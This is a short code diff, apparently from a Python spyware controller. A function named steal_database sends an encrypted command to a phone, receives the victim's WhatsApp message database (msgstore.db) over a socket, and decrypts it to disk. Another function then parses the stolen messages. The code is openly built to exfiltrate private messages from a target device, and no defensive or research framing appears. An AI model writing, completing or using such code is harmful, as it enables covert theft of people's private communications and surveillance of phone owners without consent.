@@ -29,13 +29,18 @@ def steal_database():
         conn.send(ciphertext)
         print("Encrypted 'get database' command sent to phone")
         count += 1
-        with open("msgstore.db", "w+") as db:
+        with open("msgstore.db.enc", "wb") as db:
             database = conn.recv(2048)
             while database:
                 db.write(database)
                 database = conn.recv(2048)
             db.write(database)
-    
+
+        with open('msgstore.db.enc', 'rb') as db_enc:
+            with open("msgstore.db", 'wb') as db:
+                enc_data = db_enc.read()
+                data = obj.decrypt(enc_data)
+                db.write(data)
 
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
